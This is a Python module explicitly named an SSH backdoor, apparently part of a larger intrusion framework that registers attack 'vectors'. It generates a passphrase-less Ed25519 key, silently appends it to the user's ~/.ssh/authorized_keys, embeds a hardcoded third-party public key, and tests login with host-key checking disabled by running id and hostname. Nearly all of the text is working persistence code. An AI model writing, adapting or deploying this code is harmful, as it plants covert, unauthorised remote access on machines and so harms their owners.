"""
JAYJAY SSH BACKDOOR — SSH Key Management & Backdoor
Ed25519 Key Generation, authorized_keys Injection, Connection Test
"""
import os, subprocess, json
from datetime import datetime

class SSHBackdoor:
    """Verwaltet den JAYJAY SSH-Zugang."""

    MOONSHOT_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJXVeH2Ui/WXuIFhMABcDiN7C/6r89kCp9vihbez/tVO moonshot@space.local"

    def __init__(self, core, keys_dir=None):
        self.core = core
        self.keys_dir = keys_dir or os.path.expanduser("~/.jayjay/keys")
        self.private_key = os.path.join(self.keys_dir, "jayjay_master_key")
        self.public_key = os.path.join(self.keys_dir, "jayjay_master_key.pub")

    def generate_keys(self):
        os.makedirs(self.keys_dir, exist_ok=True)
        if not os.path.exists(self.private_key):
            try:
                subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", self.private_key, 
                               "-N", "", "-C", "jayjay@nexus"], check=True, capture_output=True, timeout=10)
                self.core.log("INFO", "Generated Ed25519 SSH key pair", "SSH")
            except Exception as e:
                self.core.log("ERROR", f"Key generation failed: {e}", "SSH")
                return {"error": str(e)}

        with open(self.public_key) as f:
            pub = f.read().strip()
        self.core.register_vector("SSH_BACKDOOR", "ACTIVE", {"public_key": pub, "path": self.private_key})
        return {"public_key": pub, "private_key": self.private_key}

    def install_authorized_key(self):
        try:
            ssh_dir = os.path.expanduser("~/.ssh")
            os.makedirs(ssh_dir, exist_ok=True)
            auth_file = os.path.join(ssh_dir, "authorized_keys")

            with open(self.public_key) as f:
                pub = f.read().strip()

            existing = ""
            if os.path.exists(auth_file):
                with open(auth_file) as f:
                    existing = f.read()

            if pub not in existing:
                with open(auth_file, "a") as f:
                    f.write(f"\n{pub}\n")

            os.chmod(auth_file, 0o600)
            return {"status": "INSTALLED", "path": auth_file}
        except Exception as e:
            return {"status": "FAILED", "error": str(e)}

    def test_connection(self):
        try:
            result = subprocess.run(
                ["ssh", "-i", self.private_key, "-o", "StrictHostKeyChecking=no",
                 "-o", "UserKnownHostsFile=/dev/null", "-o", "BatchMode=yes",
                 "kimi@localhost", "echo JAYJAY_ACTIVE; id; hostname"],
                capture_output=True, text=True, timeout=10
            )
            return {
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr
            }
        except Exception as e:
            return {"error": str(e)}

    def get_moonshot_key(self):
        return {
            "key": self.MOONSHOT_KEY,
            "fingerprint": "SHA256:eFfO03bt6rU5heSW9XvqDKajbht9efgBf42ckKx7bwc",
            "comment": "moonshot@space.local",
            "status": "PUBLIC_ONLY"
        }
